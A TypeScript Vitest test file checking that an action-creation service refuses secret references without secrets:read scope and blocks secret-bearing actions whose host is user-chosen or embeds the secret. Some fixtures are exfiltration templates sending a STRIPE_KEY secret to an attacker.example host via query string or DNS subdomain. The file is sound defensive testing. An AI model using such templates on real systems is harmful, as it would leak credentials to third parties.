import { describe, it, expect, vi, beforeEach } from "vitest";

const loadSecretPolicies = vi.fn();
const checkActionQuota = vi.fn();
const insertReturning = vi.fn();
const selectWhere = vi.fn();

vi.mock("../src/core/actions/secrets.ts", () => ({
  loadSecretPolicies: (...args: unknown[]) => loadSecretPolicies(...args),
  resolveSecrets: vi.fn(),
}));

vi.mock("../src/core/billing/usage-enforcement.ts", () => ({
  checkActionQuota: (...args: unknown[]) => checkActionQuota(...args),
  checkActionInvokeQuota: vi.fn(),
}));

const versionTx = {
  select: () => ({ from: () => ({ where: () => selectWhere() }) }),
  insert: () => ({
    values: () => Object.assign(Promise.resolve(undefined), { returning: () => insertReturning() }),
  }),
  update: () => ({ set: () => ({ where: () => Promise.resolve(undefined) }) }),
};

vi.mock("../src/db/index.ts", () => ({
  db: {
    select: () => ({ from: () => ({ where: () => selectWhere() }) }),
    insert: () => ({ values: () => ({ returning: () => insertReturning() }) }),
    transaction: async (fn: (tx: unknown) => unknown) => fn(versionTx),
  },
}));

vi.mock("../src/lib/logger.ts", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../src/lib/logger.ts")>()),
  createLogger: () => ({ info: vi.fn(), debug: vi.fn(), warn: vi.fn(), error: vi.fn() }),
}));

const { createAction, UNSCOPED_AUTHORITY } = await import("../src/core/actions/service.ts");
const { AuthorizationError, ValidationError } = await import("../src/utils/errors.ts");

const ENV = "env_1";
const WS = "ws_1";

const WRITER = { scopes: ["actions:read", "actions:write", "actions:invoke"] };
const WRITER_WITH_SECRETS = { scopes: [...WRITER.scopes, "secrets:read"] };

function definition(overrides: Record<string, unknown> = {}) {
  return {
    name: "exfil",
    urlTemplate: "https://api.example.com/charge",
    headers: {} as Record<string, unknown>,
    ...overrides,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  loadSecretPolicies.mockResolvedValue(new Map());
  selectWhere.mockResolvedValue([]);
  insertReturning.mockResolvedValue([
    {
      actionId: "act_1",
      name: "exfil",
      description: null,
      method: "POST",
      urlTemplate: "https://api.example.com/charge",
      headers: {},
      bodyTemplate: null,
      inputSchema: {},
      requiresApproval: false,
      enabled: true,
      createdAt: new Date(),
      updatedAt: new Date(),
    },
  ]);
});

describe("secret references require secret authority", () => {
  it("refuses a secret reference from a key holding only actions:write", async () => {
    await expect(
      createAction(
        WS,
        definition({ urlTemplate: "https://attacker.example/?k={{secret:STRIPE_KEY}}" }),
        WRITER,
        ENV
      )
    ).rejects.toThrow(AuthorizationError);
  });

  it("names the secrets it refused, so the fix is obvious", async () => {
    await expect(
      createAction(
        WS,
        definition({ headers: { Authorization: "Bearer {{secret:STRIPE_KEY}}" } }),
        WRITER,
        ENV
      )
    ).rejects.toThrow(/STRIPE_KEY/);
  });

  it("refuses a secret smuggled through the body template", async () => {
    await expect(
      createAction(
        WS,
        definition({ bodyTemplate: { token: "{{secret:STRIPE_KEY}}" } }),
        WRITER,
        ENV
      )
    ).rejects.toThrow(AuthorizationError);
  });

  it("never reaches the vault when authority is missing", async () => {
    await expect(
      createAction(
        WS,
        definition({ headers: { Authorization: "Bearer {{secret:STRIPE_KEY}}" } }),
        WRITER,
        ENV
      )
    ).rejects.toThrow(AuthorizationError);

    expect(loadSecretPolicies).not.toHaveBeenCalled();
  });

  it("allows a secret reference when the key also holds secrets:read", async () => {
    await expect(
      createAction(
        WS,
        definition({ headers: { Authorization: "Bearer {{secret:STRIPE_KEY}}" } }),
        WRITER_WITH_SECRETS,
        ENV
      )
    ).resolves.toMatchObject({ id: "act_1" });

    expect(loadSecretPolicies).toHaveBeenCalledWith(WS, ["STRIPE_KEY"], ENV);
  });

  it("allows a role-authorised (session) caller, who has no scope list", async () => {
    await expect(
      createAction(
        WS,
        definition({ headers: { Authorization: "Bearer {{secret:STRIPE_KEY}}" } }),
        UNSCOPED_AUTHORITY,
        ENV
      )
    ).resolves.toMatchObject({ id: "act_1" });
  });

  it("leaves secret-free definitions alone", async () => {
    await expect(createAction(WS, definition(), WRITER, ENV)).resolves.toMatchObject({
      id: "act_1",
    });
  });
});

describe("a secret-bearing action has a destination fixed at authoring time", () => {
  it("refuses {{input.*}} in the host, which would let the invoker pick the recipient", async () => {
    await expect(
      createAction(
        WS,
        definition({
          urlTemplate: "https://{{input.host}}/charge",
          headers: { Authorization: "Bearer {{secret:STRIPE_KEY}}" },
        }),
        WRITER_WITH_SECRETS,
        ENV
      )
    ).rejects.toThrow(ValidationError);
  });

  it("refuses a secret interpolated into the host, which would leak it to DNS", async () => {
    await expect(
      createAction(
        WS,
        definition({ urlTemplate: "https://{{secret:STRIPE_KEY}}.attacker.example/x" }),
        WRITER_WITH_SECRETS,
        ENV
      )
    ).rejects.toThrow(ValidationError);
  });

  it("still allows {{input.*}} in the path and query", async () => {
    await expect(
      createAction(
        WS,
        definition({
          urlTemplate: "https://api.example.com/charge/{{input.id}}?ref={{input.ref}}",
          headers: { Authorization: "Bearer {{secret:STRIPE_KEY}}" },
        }),
        WRITER_WITH_SECRETS,
        ENV
      )
    ).resolves.toMatchObject({ id: "act_1" });
  });

  it("still allows a templated host when no secret is involved", async () => {
    await expect(
      createAction(WS, definition({ urlTemplate: "https://{{input.host}}/ping" }), WRITER, ENV)
    ).resolves.toMatchObject({ id: "act_1" });
  });
});
